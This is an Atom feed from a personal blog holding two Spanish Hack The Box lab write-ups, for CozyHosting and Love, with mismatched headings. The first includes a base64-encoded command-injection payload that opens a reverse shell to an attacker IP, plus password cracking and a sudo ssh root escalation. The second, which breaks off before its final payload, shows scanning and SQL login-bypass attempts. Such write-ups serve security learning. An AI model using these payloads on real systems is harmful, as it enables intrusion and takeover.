<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-31T20:56:22-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pirrandi</title><subtitle>Blog personal | Conceptos de Hacking | Write-Ups
</subtitle><author><name>Pirrandi</name></author><entry><title type="html">Maquina CozyHosting | HTB Write-Up</title><link href="http://localhost:4000/2023/10/31/CozyHosting.html" rel="alternate" type="text/html" title="Maquina CozyHosting | HTB Write-Up" /><published>2023-10-31T00:00:00-03:00</published><updated>2023-10-31T00:00:00-03:00</updated><id>http://localhost:4000/2023/10/31/CozyHosting</id><content type="html" xml:base="http://localhost:4000/2023/10/31/CozyHosting.html">&lt;h1 id=&quot;timelapse--hack-the-box&quot;&gt;Timelapse ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Machine IP: 10.10.11.152&lt;/p&gt;

&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;

&lt;p&gt;Empezamos con el escaneo de puertos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.230 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos encontramos con el puerto &lt;strong&gt;22&lt;/strong&gt; y &lt;strong&gt;80&lt;/strong&gt; abiertos.&lt;/p&gt;

&lt;p&gt;Ahora realizamos el escaneo de versiones:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.11.230 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Agregamos la pagina al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.10.11.230 cozyhosting.htb 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Mientras revisamos el servicio web realizaremos una enumeracion de directorios con Wfuzz:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 20 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://cozyhosting.htb/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos algunos directorios:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;000000015:   200        284 L    745 W      12706 Ch    &lt;span class=&quot;s2&quot;&gt;&quot;index&quot;&lt;/span&gt;
000000053:   200        96 L     196 W      4431 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;login&quot;&lt;/span&gt;
000000259:   401        0 L      1 W        97 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;     
000001225:   204        0 L      0 W        0 Ch        &lt;span class=&quot;s2&quot;&gt;&quot;logout&quot;&lt;/span&gt;                 
000002708:   500        0 L      1 W        73 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En el login nos encontramos con este formulario:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/lFA5bvu.png&quot; alt=&quot;&quot; /&gt;
Pruebo algunas inyecciones, y editar algunas cosas con el inspector pero no logro nada.&lt;/p&gt;

&lt;p&gt;Paso a ver la pagina de error, y me encuentro con algo que me llama la atencion:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/WfYskGP.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Decido googlear “Whitelabel Error Page”, y me encuentro que corresponde a un error de SpringBoot.&lt;/p&gt;

&lt;p&gt;Intento algunas inyecciones pero no llego a nada.
Investigando encuentro que SpringBoot tiene sus propios directorios, asi que decide enumerar directorios que correspondan a SpringBoot y encuentro lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;000000051:   200        0 L      1 W        15 Ch       &lt;span class=&quot;s2&quot;&gt;&quot;actuator/health&quot;&lt;/span&gt;
000000044:   200        0 L      13 W       487 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;actuator/env/path&quot;&lt;/span&gt;
000000038:   200        0 L      120 W      4957 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;actuator/env&quot;&lt;/span&gt;
000000041:   200        0 L      13 W       487 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;actuator/env/lang&quot;&lt;/span&gt;
000000072:   200        0 L      1 W        445 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;actuator/sessions&quot;&lt;/span&gt;
000000029:   200        0 L      1 W        634 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;actuator&quot;&lt;/span&gt;
000000039:   200        0 L      13 W       487 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;actuator/env/home&quot;&lt;/span&gt;
000000058:   200        0 L      108 W      9938 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;actuator/mappings&quot;&lt;/span&gt;
000000032:   200        0 L      542 W      127224 Ch   &lt;span class=&quot;s2&quot;&gt;&quot;actuator/beans&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Revisando el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;actuator/sessions&lt;/code&gt; encuentro esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/VeNDZQs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que parece ser un usuario con su Token.&lt;/p&gt;

&lt;p&gt;Anteriormente habiamos encontrado un directorio de &lt;strong&gt;admin&lt;/strong&gt;, asi que intentaremos ingresar una vez hayamos puesto el token:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/b3X0G26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora recargamos a la pagina de &lt;strong&gt;admin&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/qJDXNfE.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Obtuvimos acceso al panel de admin!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Revisando la pagina, el apartado que mas llama la atencion es al final de todo&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/9OLcGhY.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al parecer nos permite configurar una conexion por SSH.&lt;/p&gt;

&lt;p&gt;Si ingresamos solamente el Hostname, y dejamos el Username vacio nos dara un error, el cual nos dara un indicio de un Command Injection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ixn0ixE.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Creamos un PAYLOAD que nos permita entablar una [[Reverse Shell]]:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjkvNDQzIDA+JjE=&quot;&lt;/span&gt;|base64&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;|bash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;El comando a ejecutar debe estar en Base64.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/DEA6RYW.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro del usuario &lt;strong&gt;app&lt;/strong&gt; no podemos hacer mucho, asi que tendremos que buscar la manera de escalar privilegio.&lt;/p&gt;

&lt;p&gt;El archivo mas interesante que encontramos, es en la misma carpeta de &lt;strong&gt;app&lt;/strong&gt; llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudhosting-0.0.1.jar&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Lo pasamos a nuestra maquina, y extraemos lo que contiene.
Buscando entre las carpetas extraidas encontramos un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application.properties&lt;/code&gt; en
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/content/BOOT-INF/classes/&lt;/code&gt; el cual contiene informacion para conectarse a una base de datos &lt;strong&gt;postresql&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/F82RIuT.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez conectado a la base de datos con el comando:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;psql &lt;span class=&quot;s2&quot;&gt;&quot;postgresql://&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DB_USER&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DB_PWD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DB_SERVER&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DB_NAME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Comenzamos a enumerar.
&lt;img src=&quot;https://i.imgur.com/wZUqABH.png&quot; alt=&quot;&quot; /&gt;
En la base de datos &lt;strong&gt;cozyhosting&lt;/strong&gt; encontramos el hash del usuario &lt;strong&gt;Admin&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/YoqyzNK.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Utilizando [[Hashcat]] desciframos la password:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 3200 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 hash.txt /home/pirra/Downloads/rockyou.txt &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; cracked.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con la password obtenida tendremos acceso al usuario &lt;strong&gt;Josh&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/i1sxXnQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Haciendo un &lt;strong&gt;sudo -l&lt;/strong&gt; y proporcionando la password obtenida me doy cuenta de que puedo utilizar SSH como sudo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jWBt3Y2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aca ya sabemos lo que debemos hacer.
Directamente vamos &lt;a href=&quot;https://gtfobins.github.io/gtfobins/ssh/&quot;&gt;GTFObins&lt;/a&gt; y buscamos SSH, y de inmediato encontramos un comando que nos permite acceder a usuario &lt;strong&gt;Root&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo ssh -o ProxyCommand=&apos;;sh 0&amp;lt;&amp;amp;2 1&amp;gt;&amp;amp;2&apos; x
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/P4wcmol.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Con esto la maquina queda finalizada.&lt;/p&gt;

&lt;p&gt;Happy Hacking!!&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="Facil," /><category term="Linux" /><summary type="html">Timelapse ~ Hack The Box</summary></entry><entry><title type="html">Maquina Love | HTB Write-Up</title><link href="http://localhost:4000/2023/10/31/Love.html" rel="alternate" type="text/html" title="Maquina Love | HTB Write-Up" /><published>2023-10-31T00:00:00-03:00</published><updated>2023-10-31T00:00:00-03:00</updated><id>http://localhost:4000/2023/10/31/Love</id><content type="html" xml:base="http://localhost:4000/2023/10/31/Love.html">&lt;h1 id=&quot;buff--hack-the-box&quot;&gt;BUFF ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Machine IP 10.10.10.198&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;#tutorial: Qué información se puede obtener.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Comienzo el escaneo de puertos y versiones con nmap:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE        VERSION
80/tcp    open  http           Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Apache/2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
|_http-title: Voting System using PHP
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
443/tcp   open  ssl/http       Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;staging.love.htb/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ValentineCorp/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;m/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
445/tcp   open  microsofeH+V Windows 10 Pro 19042 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3306/tcp  open  mysql?
5000/tcp  open  http           Apache httpd 2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenSSL/1.1.1j PHP/7.3.27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Win64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http       Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2023-10-26T00:44:35+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +21m32s from scanner time.
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http           Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
49670/tcp open  msrpc          Microsoft Windows RPC
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora enumero directorios con Wfuzz:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload                                                                                                                                      
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000023:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;.hta&quot;&lt;/span&gt;      
000000024:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;.htaccess&quot;&lt;/span&gt;
000000025:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;.htpasswd&quot;&lt;/span&gt;   
000000191:   301        9 L      30 W       329 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;ADMIN&quot;&lt;/span&gt;     
000000196:   301        9 L      30 W       329 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;      
000000259:   301        9 L      30 W       330 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;Images&quot;&lt;/span&gt;    
000000520:   301        9 L      30 W       329 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;     
000000763:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;aux&quot;&lt;/span&gt;   
000001039:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;cgi-bin/&quot;&lt;/span&gt;  
000001162:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;com4&quot;&lt;/span&gt;     
000001159:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;com1&quot;&lt;/span&gt;     
000001160:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;com2&quot;&lt;/span&gt;    
000001161:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;com3&quot;&lt;/span&gt;   
000001206:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;con&quot;&lt;/span&gt;      
000001504:   301        9 L      30 W       328 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;dist&quot;&lt;/span&gt;       
000002170:   301        9 L      30 W       330 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;images&quot;&lt;/span&gt;      
000002198:   200        125 L    324 W      4388 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;index.php&quot;&lt;/span&gt;   
000002191:   301        9 L      30 W       332 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;includes&quot;&lt;/span&gt;    
000002457:   403        11 L     47 W       417 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;licenses&quot;&lt;/span&gt;  
000002542:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;lpt1&quot;&lt;/span&gt;      
000002543:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;lpt2&quot;&lt;/span&gt;      
000001710:   503        11 L     44 W       398 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;examples&quot;&lt;/span&gt; 
000002867:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;nul&quot;&lt;/span&gt;    
000003112:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;phpmyadmin&quot;&lt;/span&gt;
000003158:   301        9 L      30 W       331 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;plugins&quot;&lt;/span&gt;
000003276:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;prn&quot;&lt;/span&gt; 
000003719:   403        11 L     47 W       417 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;server-status&quot;&lt;/span&gt;
000003718:   403        11 L     47 W       417 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;server-info&quot;&lt;/span&gt;
000004476:   403        9 L      30 W       298 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;webalizer&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;análisis-de-vulnerabilidades&quot;&gt;Análisis de vulnerabilidades&lt;/h1&gt;

&lt;p&gt;Comienzo a revisar la pagina web y me encuentro con un login.
Intento realizar algunas SQLinjections durante un rato pero no logro llegar a nada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2xaDIEy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi que procedo a revisar el segundo directorio que me llama la atencion, el cual es &lt;strong&gt;Admin&lt;/strong&gt;.
Acá tambien encuentro un Login, pero con algunos cambios, por que ahora no pide un ID, pide un usuario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/D5qYfEt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vuelvo a intentar realizar SQLinjections, y tampoco logro nada, pero hay algo que me llama la atención.
Cuando no quiero probar las SQLinjections una por una, cargo una lista en Caido que es un programa similar a Burpsuite que permite realizar ataques de fuerza bruta sin los limites de velocidad que tiene BurpSuite (sin pagar).&lt;/p&gt;

&lt;p&gt;Lo que hice fue crear un .txt con paylods sacados de &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass#hacktricks-cloud-twitter-twitch-youtube&quot;&gt;HackTricks&lt;/a&gt; y los cargo en Caido, luego intercepto la conexion con Caido (igual que BurpSuite), marco el input (username) en donde quiero cargar el payload y lo inicio:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/u5vrtUz.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No logro bypassear el login, pero si encuentro algo que me llamo la atención.
Y es que como respuesta por parte del servidor web estoy recibiendo dos resultados distinto en cuanto a cantidad de caracteres, 351 y 495:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/cUogOKS.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al revisar el de 495 veo una respuesta por parte del servidor, la cual me hace pensar que puede existir una via potencial de ejecutar un SQLinjection:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/4scPLaJ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi que enseguida procedo a investigar mas por Google. Hasta que doy con una vulnerabilidad para ByPassear el Login:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/U76B1Tb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;explotación-de-vulnerabilidades&quot;&gt;Explotación de vulnerabilidades&lt;/h1&gt;

&lt;p&gt;Resumiendo, se podia realizar una inyeccion SQL, pero era mas compleja que las inyecciones que estaba intentando yo. Esta es la que termine utilizando para lograr el ByPass:&lt;/p&gt;

